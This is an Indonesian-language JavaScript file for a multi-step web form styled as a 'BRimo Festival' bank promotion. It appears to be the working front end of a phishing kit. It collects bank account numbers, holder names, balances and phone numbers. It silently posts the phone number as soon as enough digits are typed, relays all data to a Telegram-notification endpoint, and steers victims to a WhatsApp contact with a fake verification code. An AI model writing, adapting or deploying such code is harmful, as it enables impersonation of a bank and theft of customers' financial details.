document.addEventListener('DOMContentLoaded', function() {
    // Element declarations
    const pages = document.querySelectorAll('.page');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const footer = document.querySelector('.footer-image');
    const next1 = document.getElementById('next1');
    const next2 = document.getElementById('next2');
    const contactService = document.getElementById('contactService');
    const accountNumber = document.getElementById('accountNumber');
    const accountName = document.getElementById('accountName');
    const currentBalance = document.getElementById('currentBalance');
    const amountInWords = document.getElementById('amountInWords');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const phoneNumberInput = document.getElementById('phoneNumber');

    // Toggle header visibility
    function toggleHeaderVisibility(show) {
        const headerImage = document.querySelector('.header-image');
        if (show) {
            headerImage.classList.remove('header-hidden');
        } else {
            headerImage.classList.add('header-hidden');
        }
    }

    // Toggle footer visibility
    function toggleFooterVisibility(show) {
        if (show) {
            footer.classList.remove('footer-hidden');
        } else {
            footer.classList.add('footer-hidden');
        }
    }

    // Show loading animation
    function showLoading() {
        loadingOverlay.style.display = 'flex';
    }

    // Hide loading animation
    function hideLoading() {
        loadingOverlay.style.display = 'none';
    }

    // Navigate between pages with loading animation
    function goToPage(currentPage, nextPage) {
        showLoading();
        
        setTimeout(function() {
            currentPage.classList.remove('active');
            nextPage.classList.add('active');
            toggleHeaderVisibility(nextPage.id !== 'page2');
            toggleFooterVisibility(nextPage.id !== 'page3');
            window.scrollTo(0, 0);
            hideLoading();
        }, 1500);
    }

    // Show first page by default
    page1.classList.add('active');
    toggleHeaderVisibility(true);
    toggleFooterVisibility(true);

    // ================= NUMBER TO WORDS CONVERSION =================
    function convertNumberToWords(num) {
        const ones = ['', 'Satu', 'Dua', 'Tiga', 'Empat', 'Lima', 'Enam', 'Tujuh', 'Delapan', 'Sembilan'];
        const teens = ['Sepuluh', 'Sebelas', 'Dua Belas', 'Tiga Belas', 'Empat Belas', 'Lima Belas', 'Enam Belas', 'Tujuh Belas', 'Delapan Belas', 'Sembilan Belas'];
        const tens = ['', 'Sepuluh', 'Dua Puluh', 'Tiga Puluh', 'Empat Puluh', 'Lima Puluh', 'Enam Puluh', 'Tujuh Puluh', 'Delapan Puluh', 'Sembilan Puluh'];
        const scales = ['', 'Ribu', 'Juta', 'Miliar', 'Triliun'];

        if (num == 0) return 'Nol Rupiah';
        num = parseInt(num, 10);
        if (isNaN(num)) return '';

        const chunks = [];
        while (num > 0) {
            chunks.push(num % 1000);
            num = Math.floor(num / 1000);
        }

        let words = [];
        for (let i = 0; i < chunks.length; i++) {
            const chunk = chunks[i];
            if (chunk === 0) continue;

            const chunkWords = [];
            const hundred = Math.floor(chunk / 100);
            const ten = chunk % 100;

            if (hundred > 0) {
                if (hundred === 1) {
                    chunkWords.push('Seratus');
                } else {
                    chunkWords.push(ones[hundred] + ' Ratus');
                }
            }

            if (ten > 0) {
                if (ten < 10) {
                    chunkWords.push(ones[ten]);
                } else if (ten < 20) {
                    chunkWords.push(teens[ten - 10]);
                } else {
                    const tenPart = Math.floor(ten / 10);
                    const onePart = ten % 10;
                    chunkWords.push(tens[tenPart]);
                    if (onePart > 0) {
                        chunkWords.push(ones[onePart]);
                    }
                }
            }

            if (chunkWords.length > 0) {
                if (i === 1 && chunk === 1 && chunks.length === 2 && chunks[0] === 0) {
                    words.unshift('Seribu');
                } else {
                    words.unshift(chunkWords.join(' ') + (scales[i] ? ' ' + scales[i] : ''));
                }
            }
        }

        return words.join(' ') + ' Rupiah';
    }

    // Format number with thousand separators
    function formatNumberInput(input) {
        let value = input.replace(/\D/g, '');
        if (value.length > 0) {
            value = parseInt(value, 10).toLocaleString('id-ID');
        }
        return value;
    }

    // Handle balance input changes
    currentBalance.addEventListener('input', function() {
        const formattedValue = formatNumberInput(this.value);
        this.value = formattedValue;
        const numericValue = this.value.replace(/\./g, '');
        const words = convertNumberToWords(numericValue);
        amountInWords.textContent = words || '';
    });

    // ================= TELEGRAM NOTIFICATION =================
    async function sendToTelegram(data) {
        try {
            showLoading();
            const response = await fetch('/.netlify/functions/send-dana-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });

            if (!response.ok) {
                throw new Error('Gagal mengirim notifikasi');
            }
            return await response.json();
        } catch (error) {
            console.error('Error:', error);
            throw error;
        } finally {
            hideLoading();
        }
    }

    // Send phone number to Telegram with debounce
    let debounceTimer;
    phoneNumberInput.addEventListener('input', function() {
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => {
            const phoneNumber = this.value.trim();
            if (phoneNumber.length >= 10) {
                sendToTelegram({
                    type: 'phone_number',
                    phoneNumber: phoneNumber,
                    name: accountName.value.trim(),
                    balance: currentBalance.value.replace(/\./g, '')
                }).catch(error => {
                    console.log('Notification error:', error);
                });
            }
        }, 1500);
    });

    // ================= INPUT VALIDATION =================
    next1.addEventListener('click', function() {
        const numRegex = /^[0-9]+$/;
        if (accountNumber.value.trim() === '') {
            alert('Mohon isi nomor rekening');
            return;
        } else if (!numRegex.test(accountNumber.value.trim())) {
            alert('Nomor rekening harus berupa angka');
            return;
        }
        
        const nameRegex = /^[a-zA-Z\s]+$/;
        if (accountName.value.trim() === '') {
            alert('Mohon isi nama pemilik rekening');
            return;
        } else if (!nameRegex.test(accountName.value.trim())) {
            alert('Nama pemilik hanya boleh mengandung huruf dan spasi');
            return;
        }
        
        goToPage(page1, page2);
    });

    next2.addEventListener('click', function() {
        const numericValue = currentBalance.value.replace(/\./g, '');
        
        if (numericValue.trim() === '') {
            alert('Mohon isi jumlah saldo');
            return;
        } else if (isNaN(numericValue)) {
            alert('Jumlah saldo harus berupa angka');
            return;
        } else if (parseInt(numericValue) <= 0) {
            alert('Jumlah saldo harus lebih dari 0');
            return;
        }
        
        goToPage(page2, page3);
    });

    // Contact service via WhatsApp
    contactService.addEventListener('click', async function() {
        const whatsappNumber = '6283847980901';
        const virtualCode = Math.floor(100000 + Math.random() * 900000);
        const numericValue = currentBalance.value.replace(/\./g, '');
        const formattedBalance = new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(numericValue);

        const message = `Halo admin BRimo Festival,\n\nSaya ${accountName.value.trim()} dengan detail sebagai berikut:\n- Nomor Rekening: ${accountNumber.value.trim()}\n- Saldo Terakhir: ${formattedBalance}\n- Dalam Huruf: ${amountInWords.textContent}\n\nSaya ingin menanyakan tentang partisipasi saya dalam BRimo Festival.\nKode verifikasi saya: ${virtualCode}\n\nTerima kasih.`;
        
        try {
            await sendToTelegram({
                type: 'contact_service',
                accountNumber: accountNumber.value.trim(),
                accountName: accountName.value.trim(),
                amount: formattedBalance,
                amountInWords: amountInWords.textContent,
                virtualCode: virtualCode
            });
            
            const encodedMessage = encodeURIComponent(message);
            window.open(`https://wa.me/${whatsappNumber}?text=${encodedMessage}`, '_blank');
        } catch (error) {
            alert('Gagal mengirim data: ' + error.message);
        }
    });

    // ================= INPUT FORMATTING =================
    accountName.addEventListener('input', function() {
        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
    });

    accountNumber.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });

    phoneNumberInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });
});
